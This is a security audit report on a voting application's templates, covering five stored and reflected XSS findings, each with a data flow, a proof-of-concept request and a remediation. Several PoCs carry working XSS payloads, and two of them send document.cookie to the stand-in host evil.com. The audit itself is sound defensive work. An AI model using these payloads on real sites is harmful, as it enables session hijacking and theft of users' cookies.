### Summary

The audit identified **5 findings** (2 HIGH, 3 MEDIUM) related to ASVS 3.2.2. The codebase lacks systematic output encoding for user-provided content rendered in both HTML and JavaScript contexts. While EZT's `[format "js,html"]` directive is used in some JavaScript `onclick` handlers (showing developer awareness), it is **not applied** to the majority of template outputs, creating widespread stored and reflected XSS vulnerabilities. The `rewrite_description()` function explicitly constructs HTML from user-provided text without escaping, representing a particularly dangerous pattern.

## Findings

### High Severity

#### ASVS-322-HIGH-001: Stored XSS via Issue Descriptions Rendered as Raw HTML

**Severity:** HIGH  
**Gap Type:** Type A — No output encoding control applied at any point in the rendering pipeline

**Location:** `v3/server/pages.py` `rewrite_description()` (lines 28–36) and templates `vote-on.ezt`, `manage.ezt`, `manage-stv.ezt`

**Related Functions Checked:**
- `rewrite_description()` (pages.py:28-36)
- `vote_on_page()` (pages.py:254)
- `add_issue_page()` (pages.py:518)

**Vulnerable Code (pages.py:28-36):**
```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    # Wrap in <pre>
    issue.description = f'<pre>{desc}</pre>'
```

**Vulnerable Template (vote-on.ezt):**
```html
<div id="description-[issues.iid]" class="description mt-2 text-muted small">
  [issues.description]
</div>
```

**Vulnerable Template (manage.ezt, manage-stv.ezt):**
```html
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

**Data Flow:**
1. **Source:** Admin submits POST `/do-add-issue/<eid>` or `/do-edit-issue/<eid>/<iid>` with `description` form field
2. **Store:** `election.add_issue(form.title, form.description, vtype, kv)` (pages.py:518)
3. **Retrieve:** `election.list_issues()` in `vote_on_page()` (pages.py:254)
4. **Process:** `rewrite_description(issue)` wraps in `<pre>` — **no HTML escaping** (pages.py:279)
5. **Sink:** `[issues.description]` rendered as raw HTML in templates

Note: In `manage.ezt` and `manage-stv.ezt`, the description is rendered directly from the database without even passing through `rewrite_description()`, also without escaping.

**Proof of Concept:**
```
POST /do-add-issue/VALID_EID HTTP/1.1
Content-Type: application/x-www-form-urlencoded

title=Budget+Proposal&description=<img+src=x+onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

When any voter views this election at `/vote-on/VALID_EID`, the injected script executes in their browser.

**Impact:** Any election admin (committer) can inject persistent JavaScript that executes in the browsers of all voters viewing that election, enabling session hijacking, vote manipulation, or data exfiltration.

**Remediation:**
```python
import html

def rewrite_description(issue):
    """Rewrite issue description: escape HTML, wrap in <pre>, and convert doc:filename to links."""
    import re
    desc = html.escape(issue.description)  # Escape FIRST
    # Replace doc:filename with <a> link (filename is already escaped)
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

For templates where `rewrite_description()` is NOT called (manage.ezt, manage-stv.ezt), use EZT format escaping:
```
<div id="description-[issues.iid]" class="description mt-2">[format "html"][issues.description][end]</div>
```

#### ASVS-322-HIGH-002: Stored XSS via Election/Issue Titles Rendered Without HTML Escaping

**Severity:** HIGH  
**Gap Type:** Type B — Escaping control EXISTS (`[format "html"]`) but NOT APPLIED to title rendering in HTML body context, creating false confidence since it IS applied in onclick contexts

**Locations:** Multiple templates

**Related Functions Checked:**
- `create_election_page()` (pages.py:456)
- `add_issue_page()` (pages.py:518)
- Template rendering across all `.ezt` files

**Vulnerable Template Outputs:**

| Template | Line | Code | Context |
|----------|------|------|---------|
| `admin.ezt` | ~14 | `<h5 class="card-title">[owned.title]...` | HTML body |
| `manage.ezt` | ~8 | `<h2>[e_title]</h2>` | HTML body |
| `manage.ezt` | ~187 | `<strong>[issues.title]</strong>` | HTML body |
| `manage-stv.ezt` | ~6 | `<h2>[e_title]</h2>` | HTML body |
| `manage-stv.ezt` | ~137 | `<strong>[issues.title]</strong>` | HTML body |
| `vote-on.ezt` | ~9 | `<h1 class="h4 mb-0 fw-semibold">[election.title]</h1>` | HTML body |
| `vote-on.ezt` | ~49 | `<strong>[issues.title]</strong>` | HTML body |
| `voter.ezt` | ~33 | `<h5 class="card-title mb-3">[open_elections.title]</h5>` | HTML body |
| `voter.ezt` | ~67 | `<h5 class="card-title mb-3">[upcoming_elections.title]</h5>` | HTML body |

**Contrast with existing safe pattern (manage.ezt:~194-196):**
```html
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

The `[format "js,html"]` directive IS used here but **not** in the HTML body outputs above. This is a Type B gap — the control exists and is used in some contexts but not others.

**Data Flow:**
1. **Source:** Admin submits POST `/do-create-election` with `title` form field, or POST `/do-add-issue/<eid>` with `title` field
2. **Store:** `steve.election.Election.create(DB_FNAME, form.title, result.uid)` (pages.py:456)
3. **Retrieve:** `election.get_metadata()` or `election.list_issues()`
4. **Sink:** `[e_title]`, `[issues.title]`, `[owned.title]`, etc. rendered as raw HTML

**Proof of Concept:**
```
POST /do-create-election HTTP/1.1
Content-Type: application/x-www-form-urlencoded

title=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

The injected title renders as executable HTML on the admin page, voter page, management page, and voting page.

**Impact:** Same as ASVS-322-HIGH-001. Affects all users who view the election listing or management pages.

**Remediation:** Apply `[format "html"]` to ALL user-provided values in HTML body context:
```html
<h2>[format "html"][e_title][end]</h2>
<strong>[format "html"][issues.title][end]</strong>
<h5 class="card-title">[format "html"][owned.title][end]</h5>
```

### Medium Severity

#### ASVS-322-MED-001: JavaScript Injection via STV Candidate Data in Inline Script

**Severity:** MEDIUM  
**Gap Type:** Type B — `[format "js,html"]` exists and is used elsewhere, but NOT applied in the `STV_CANDIDATES` JavaScript object literal

**Location:** `v3/server/templates/vote-on.ezt` (inline `<script>` block)

**Related Functions Checked:**
- `vote_on_page()` (pages.py:254)
- `makeItem()` JavaScript function (vote-on.ezt)
- Client-side `escapeHtml()` function (vote-on.ezt:~350)

**Vulnerable Code:**
```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",                              // ← UNESCAPED
      candidates: [
[for issues.candidates]        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },  // ← UNESCAPED
[end]      ]
    },
[end][end]  };
```

**Data Flow:**
1. **Source:** Admin creates STV issue with title or candidate names containing JS-breaking characters
2. **Store:** Stored in database via `election.add_issue()` or KV store for labelmap
3. **Retrieve:** `election.list_issues()` in `vote_on_page()`
4. **Sink:** Template embeds values directly in JavaScript string literals without `[format "js"]`

**Proof of Concept:**
An issue title containing:
```
</script><script>alert(document.cookie)</script><script>var x="
```
Would close the existing `<script>` block and inject arbitrary JavaScript, bypassing the string literal context entirely.

**Impact:** Any voter viewing the election voting page would execute attacker-controlled JavaScript. Note that the client-side `escapeHtml()` function used in `makeItem()` is bypassed because the data source (`STV_CANDIDATES`) is already corrupted at the template level.

**Remediation:**
```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[format "js"][issues.iid][end]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
[end][end]  };
```

#### ASVS-322-MED-002: Reflected XSS via URL Path Parameters in Error Pages

**Severity:** MEDIUM  
**Gap Type:** Type A — No output encoding applied

**Location:** `v3/server/templates/e_bad_eid.ezt`, `v3/server/templates/e_bad_iid.ezt`

**Related Functions Checked:**
- `load_election()` decorator (pages.py:172)
- `raise_404()` function
- Error template rendering

**Vulnerable Code (e_bad_eid.ezt):**
```html
The Election ID ([eid]) does not exist,
```

**Vulnerable Code (e_bad_iid.ezt):**
```html
The Issue ID ([iid]) does not exist,
```

**Data Flow:**
1. **Source:** Attacker crafts URL: `/vote-on/%3Cscript%3Ealert(1)%3C%2Fscript%3E`
2. **Process:** Quart URL-decodes path parameter to `<script>alert(1)</script>`
3. **Assign:** `result.eid = eid` in `load_election` decorator (pages.py:172)
4. **Render:** `raise_404(T_BAD_EID, result)` renders template with raw `[eid]`
5. **Sink:** `[eid]` output as raw HTML in error page

**Proof of Concept:**
```
GET /vote-on/%3Cimg%20src%3Dx%20onerror%3D%22alert(document.cookie)%22%3E HTTP/1.1
```

The URL is decoded by Quart, and the `eid` value `<img src=x onerror="alert(document.cookie)">` is rendered directly in the 404 page HTML.

**Impact:** Attacker can craft URLs that, when clicked by authenticated users, execute JavaScript in their browser session. Lower severity than stored XSS because it requires user interaction (clicking a link).

**Remediation:**
```html
The Election ID ([format "html"][eid][end]) does not exist,
```

Apply same fix to `e_bad_iid.ezt`:
```html
The Issue ID ([format "html"][iid][end]) does not exist,
```

#### ASVS-322-MED-003: Reflected XSS via Flash Messages Containing User-Provided Input

**Severity:** MEDIUM  
**Gap Type:** Type A — No output encoding applied to flash message content

**Location:** `v3/server/pages.py` (multiple flash calls) and flash rendering template

**Related Functions Checked:**
- `do_create_endpoint()` (pages.py:459)
- `do_add_issue_endpoint()` (pages.py:521)
- `do_edit_issue_endpoint()` (pages.py:543)
- `do_vote_endpoint()` (pages.py:427, 435)
- `basic_info()` flash retrieval (pages.py:73-77)

**Vulnerable Code (pages.py):**
```python
# Line 459
await flash_success(f'Created election: {form.title}')

# Line 521
await flash_success(f'Issue "{form.title}" has been added.')

# Line 543
await flash_success(f'Issue "{form.title}" has been updated.')

# Line 427
await flash_danger(f'Invalid issue ID: {iid}')

# Line 435
await flash_danger(f'Error submitting vote for issue {iid}.')
```

**Data Flow (title-based):**
1. **Source:** Form submission with `title` field containing HTML
2. **Process:** `f'Created election: {form.title}'` interpolates unsanitized input
3. **Store:** `quart.flash()` stores message in session
4. **Retrieve:** `quart.get_flashed_messages()` in `basic_info()` (pages.py:73-77)
5. **Sink:** Template renders `[flashes.message]` as raw HTML

**Data Flow (iid-based, pages.py:420-427):**
```python
for key, value in form.items():
    if key.startswith('vote-'):
        iid = key.split('-', 1)[1]  # User-controllable form key
        votes[iid] = value
...
await flash_danger(f'Invalid issue ID: {iid}')
```

**Proof of Concept:**
```
POST /do-vote/VALID_EID HTTP/1.1
Content-Type: application/x-www-form-urlencoded

vote-<img+src=x+onerror="alert(1)">=y
```

If the IID isn't found, the flash message `Invalid issue ID: <img src=x onerror="alert(1)">` is stored and rendered on the redirect page.

**Impact:** XSS via flash messages. For title-based vectors, the attacker must submit a form (self-XSS unless combined with CSRF). For iid-based vectors, a crafted form key directly injects into the flash message.

**Remediation:**
```python
import html

await flash_success(f'Created election: {html.escape(form.title)}')
await flash_success(f'Issue "{html.escape(form.title)}" has been added.')
await flash_danger(f'Invalid issue ID: {html.escape(iid)}')
```

Alternatively, apply HTML escaping in the flash template:
```html
[for flashes]
<div class="alert alert-[flashes.category]">[format "html"][flashes.message][end]</div>
[end]
```

## Architecture Observations

1. **EZT templates render raw by default** — Unlike modern frameworks (Jinja2, Django, React), EZT does NOT auto-escape HTML. Every variable output requires explicit `[format "html"]` wrapping. This is an inherently unsafe default that requires developer vigilance at every output point.

2. **`rewrite_description()` creates an HTML-safety illusion** — The function name and wrapping in `<pre>` suggests the content is being prepared for safe display, but it actually makes the content MORE dangerous by marking it as intentional HTML while failing to escape the user-provided text within.

3. **Inconsistent escaping strategy** — The presence of `[format "js,html"]` in onclick handlers but its absence in HTML body contexts suggests ad-hoc rather than systematic escaping. This creates a maintenance burden where every new template output is a potential XSS vector.

4. **No server-side content sanitization layer** — There is no middleware or utility that sanitizes or escapes user input before storage or before template rendering. All escaping responsibility falls on individual template outputs.

---

## Recommendations Summary

### Immediate Actions (Critical Priority)

1. **Enable HTML auto-escaping at the template engine level.** If EZT cannot be configured for auto-escaping, consider migrating to Jinja2 (which Quart natively supports) with `autoescape=True`.

2. **Fix `rewrite_description()` to call `html.escape()`** on the description BEFORE wrapping in `<pre>` and before regex substitution.

### Short-term Actions (High Priority — This Sprint)

3. **Add `[format "html"]` to ALL user-provided variable outputs** across all templates. Audit each `[variable]` reference against the user-controllable data inventory above.

4. **Add `[format "js"]` to all variable outputs within `<script>` blocks**, particularly the `STV_CANDIDATES` object literal in `vote-on.ezt`.

5. **Implement server-side HTML escaping for flash message content** in `pages.py` using `html.escape()` before passing to `quart.flash()`.

### Long-term Actions (Medium Priority — Next Sprint)

6. **Add `[format "html"]` to error template outputs** (`e_bad_eid.ezt`, `e_bad_iid.ezt`, `e_bad_pid.ezt`).

7. **Establish a secure coding standard** documenting when and how to apply output encoding in EZT templates, with code review checklists.

8. **Implement automated testing** for XSS vulnerabilities using tools like ZAP or Burp Suite in CI/CD pipeline.
